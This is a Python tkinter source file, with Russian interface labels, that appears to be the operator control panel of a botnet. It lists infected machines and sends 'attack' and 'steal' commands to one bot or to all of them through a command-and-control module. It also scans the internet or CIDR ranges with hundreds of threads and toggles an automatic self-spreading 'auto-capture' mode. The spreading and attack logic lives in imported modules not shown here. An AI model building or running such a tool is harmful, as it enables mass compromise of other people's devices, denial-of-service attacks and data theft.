import tkinter as tk
from tkinter import ttk, messagebox, simpledialog, scrolledtext, filedialog
import json, os, threading, queue, ipaddress, time
from botnet.c2 import broadcast_command
from utils.logger import log
from utils.widgets import ToolTip
from botnet.auto_spreader import AutoSpreader

class BotnetTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.bot_data = []
        self.spreader = AutoSpreader()
        self.auto_refresh_enabled = True
        self.build_ui()
        self.load_bots()
        self.start_auto_refresh()

    def build_ui(self):
        nb = ttk.Notebook(self)
        nb.pack(fill=tk.BOTH, expand=True)

        # Вкладка "Список"
        list_frame = ttk.Frame(nb)
        nb.add(list_frame, text="Список")
        control_frame = ttk.Frame(list_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(control_frame, text="Обновить", command=self.load_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(control_frame, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
        self.auto_refresh_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(control_frame, text="Автообновление", variable=self.auto_refresh_var,
                        command=self.toggle_auto_refresh).pack(side=tk.LEFT, padx=5)
        filter_frame = ttk.Frame(list_frame)
        filter_frame.pack(fill=tk.X, padx=5)
        ttk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
        self.filter_entry = ttk.Entry(filter_frame, width=30)
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        self.filter_entry.bind("<KeyRelease>", lambda e: self.apply_filter())
        columns = ("ID", "IP", "OS", "Status", "Bandwidth")
        self.tree = ttk.Treeview(list_frame, columns=columns, show="headings")
        for col in columns:
            self.tree.heading(col, text=col, command=lambda c=col: self.sort_by(c))
            self.tree.column(col, width=120)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.tree.bind("<Button-3>", self.show_context_menu)
        self.context_menu = tk.Menu(self, tearoff=0)
        self.context_menu.add_command(label="Атаковать", command=self.context_attack)
        self.context_menu.add_command(label="Сбор данных", command=self.context_steal)
        self.status_label = ttk.Label(list_frame, text="Ботов: 0")
        self.status_label.pack(anchor=tk.W, padx=5)

        # Вкладка "Сканирование"
        scan_frame = ttk.Frame(nb)
        nb.add(scan_frame, text="Сканирование")
        
        settings_frame = ttk.LabelFrame(scan_frame, text="Параметры")
        settings_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(settings_frame, text="Диапазон (CIDR):").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.scan_target = ttk.Entry(settings_frame, width=30)
        self.scan_target.grid(row=0, column=1, padx=5)
        self.scan_target.insert(0, "192.168.1.0/24")
        ttk.Label(settings_frame, text="Потоков:").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.scan_threads = ttk.Entry(settings_frame, width=10)
        self.scan_threads.grid(row=1, column=1, padx=5, sticky=tk.W)
        self.scan_threads.insert(0, "500")
        
        btn_frame = ttk.Frame(scan_frame)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(btn_frame, text="Сканировать интернет", command=self.scan_internet).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Сканировать диапазон", command=self.scan_range).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Остановить", command=self.stop_scan).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Копировать лог", command=self.copy_log).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Сохранить лог", command=self.save_log).pack(side=tk.LEFT, padx=2)
        
        self.progress_var = tk.IntVar()
        self.progress_bar = ttk.Progressbar(scan_frame, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill=tk.X, padx=5, pady=2)
        
        self.scan_log = scrolledtext.ScrolledText(scan_frame, height=12, state=tk.NORMAL)
        self.scan_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Вкладка "Автозахват"
        auto_frame = ttk.Frame(nb)
        nb.add(auto_frame, text="Автозахват")
        ttk.Label(auto_frame, text="Статус:").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.auto_status_label = ttk.Label(auto_frame, text="Неактивен")
        self.auto_status_label.grid(row=0, column=1, sticky=tk.W)
        self.toggle_btn = ttk.Button(auto_frame, text="Запустить", command=self.toggle_spreader)
        self.toggle_btn.grid(row=1, column=0, padx=5, pady=5)
        ttk.Button(auto_frame, text="Применить настройки", command=self.reload_spreader).grid(row=1, column=1, padx=5)
        ttk.Label(auto_frame, text="Интервал (сек):").grid(row=2, column=0, padx=5, sticky=tk.W)
        self.interval_var = tk.StringVar(value="30")
        ttk.Entry(auto_frame, textvariable=self.interval_var, width=10).grid(row=2, column=1, padx=5, sticky=tk.W)
        ttk.Label(auto_frame, text="Потоков:").grid(row=3, column=0, padx=5, sticky=tk.W)
        self.auto_threads_var = tk.StringVar(value="500")
        ttk.Entry(auto_frame, textvariable=self.auto_threads_var, width=10).grid(row=3, column=1, padx=5, sticky=tk.W)

        self.process_messages()

    def start_auto_refresh(self):
        if self.auto_refresh_enabled:
            self.load_bots()
            self.after(30000, self.start_auto_refresh)

    def toggle_auto_refresh(self):
        self.auto_refresh_enabled = self.auto_refresh_var.get()
        if self.auto_refresh_enabled:
            self.start_auto_refresh()

    def log_to_scan(self, message):
        self.scan_log.insert(tk.END, message + "\n")
        self.scan_log.see(tk.END)

    def copy_log(self):
        self.clipboard_clear()
        self.clipboard_append(self.scan_log.get(1.0, tk.END))
        messagebox.showinfo("Скопировано", "Лог скопирован в буфер обмена")

    def save_log(self):
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if filename:
            with open(filename, 'w') as f:
                f.write(self.scan_log.get(1.0, tk.END))
            messagebox.showinfo("Сохранено", f"Лог сохранён в {filename}")

    def process_messages(self):
        try:
            while True:
                msg = self.spreader.message_queue.get_nowait()
                self.log_to_scan(msg)
                if "[Progress]" in msg:
                    try:
                        pct = int(msg.split("(")[1].split("%")[0])
                        self.progress_var.set(pct)
                    except:
                        pass
        except queue.Empty:
            pass
        self.after(100, self.process_messages)

    def scan_internet(self):
        self.spreader.stop()
        self.spreader.load_settings("avz_settings.json")
        self.spreader.worker_threads = int(self.scan_threads.get())
        self.spreader.interval = 0
        self.progress_var.set(0)
        threading.Thread(target=self._run_scan_once_global, daemon=True).start()

    def _run_scan_once_global(self):
        self.spreader.start()

    def scan_range(self):
        target = self.scan_target.get()
        if not target: return
        if '/' in target:
            try:
                network = ipaddress.IPv4Network(target, strict=False)
                targets = [str(host) for host in network.hosts()]
            except:
                messagebox.showerror("Ошибка", "Некорректный CIDR")
                return
        else:
            targets = [target]
        self.progress_var.set(0)
        self.spreader.scan_once(targets)

    def stop_scan(self):
        self.spreader.stop()
        self.log_to_scan("[Сканирование] Остановлено")
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        auto_filename = f"scan_log_{timestamp}.txt"
        with open(auto_filename, 'w') as f:
            f.write(self.scan_log.get(1.0, tk.END))
        self.log_to_scan(f"[Auto] Лог сохранён: {auto_filename}")

    def toggle_spreader(self):
        if self.spreader.running:
            self.spreader.stop()
            self.auto_status_label.config(text="Неактивен")
            self.toggle_btn.config(text="Запустить")
        else:
            self.save_auto_settings()
            self.spreader.load_settings("avz_settings.json")
            self.spreader.start()
            self.auto_status_label.config(text="Активен")
            self.toggle_btn.config(text="Остановить")

    def save_auto_settings(self):
        try:
            with open("avz_settings.json","r") as f: s = json.load(f)
        except: s = {}
        s["auto_spread_interval_min"] = int(self.interval_var.get()) / 60
        s["spread_worker_threads"] = int(self.auto_threads_var.get())
        s["auto_spread_enabled"] = True
        with open("avz_settings.json","w") as f:
            json.dump(s, f, indent=2)

    def reload_spreader(self):
        self.save_auto_settings()
        self.spreader.load_settings("avz_settings.json")
        self.log_to_scan("[Автозахват] Настройки обновлены")

    # --- Полные методы для списка ботов ---
    def load_bots(self):
        if os.path.exists("bots.json"):
            with open("bots.json", "r") as f:
                raw_data = json.load(f)
        else:
            raw_data = []
        self.bot_data = []
        for item in raw_data:
            if isinstance(item, dict):
                bot = item.copy()
            elif isinstance(item, str):
                bot = {"id": item, "ip": "", "os": "", "status": "offline", "bandwidth": 0}
            else:
                continue
            bot.setdefault("id", "unknown")
            bot.setdefault("ip", "")
            bot.setdefault("os", "")
            bot.setdefault("status", "offline")
            bot.setdefault("bandwidth", 0)
            self.bot_data.append(bot)
        self.populate_tree()
        self.status_label.config(text=f"Ботов: {len(self.bot_data)}")

    def populate_tree(self, filtered=None):
        self.tree.delete(*self.tree.get_children())
        data = filtered if filtered is not None else self.bot_data
        for bot in data:
            status = bot.get("status","offline")
            os_type = bot.get("os","linux")
            os_icon = {"linux":"🐧 Linux","windows":"🪟 Windows","iot":"📡 IoT"}.get(os_type, os_type)
            tag = "online" if status == "online" else "offline"
            self.tree.insert("", tk.END, values=(
                bot.get("id",""),
                bot.get("ip",""),
                os_icon,
                status,
                f"{bot.get('bandwidth',0)} Mbps"
            ), tags=(tag,))
        self.tree.tag_configure('online', foreground='green')
        self.tree.tag_configure('offline', foreground='red')

    def apply_filter(self):
        text = self.filter_entry.get().lower()
        if not text:
            self.populate_tree()
            return
        filtered = [b for b in self.bot_data if text in str(b).lower()]
        self.populate_tree(filtered)

    def sort_by(self, col):
        idx = ["id","ip","os","status","bandwidth"].index(col.lower())
        self.bot_data.sort(key=lambda b: str(b.get(col.lower(),"")))
        self.populate_tree()

    def show_context_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.context_menu.post(event.x_root, event.y_root)

    def get_selected_bot(self):
        selection = self.tree.selection()
        if selection:
            values = self.tree.item(selection[0], 'values')
            return {'id': values[0], 'ip': values[1], 'os': values[2], 'status': values[3], 'bandwidth': values[4]}
        return None

    def context_attack(self):
        bot = self.get_selected_bot()
        if bot:
            target = simpledialog.askstring("Атака", "Цель:")
            if target:
                broadcast_command({"action":"attack","target":target,"bot_id":bot['id']})

    def context_steal(self):
        bot = self.get_selected_bot()
        if bot:
            broadcast_command({"action":"steal","bot_id":bot['id']})

    def mass_attack(self):
        target = simpledialog.askstring("Массовая атака", "Цель:")
        if target:
            broadcast_command({"action":"attack","target":target})
